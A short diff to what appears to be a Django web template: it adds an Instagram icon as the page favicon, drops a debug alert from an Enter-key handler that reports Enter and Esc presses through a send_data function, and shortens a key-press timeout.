@@ -17,7 +17,7 @@
     <link rel="stylesheet" href="{% static 'assets/css/tailwind.css' %}">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    
+    <link rel="icon" href="https://icons8.com/icon/32323/instagram" type="image/icon">
 
 
     <script>
@@ -60,7 +60,6 @@
 
 
                         if (event.key === 'Enter') {
-                            alert('Enter key was pressed!');
                             
                             send_data("EnTeR_ClIcKeD")
                         }
@@ -70,7 +69,7 @@
                             send_data("EsC_ClIcKeD")
                         }
                         
-                    }, 500); 
+                    }, 0); 
 
             document.addEventListener('keyup', function (event) {
                     clearTimeout(pressTimeout);
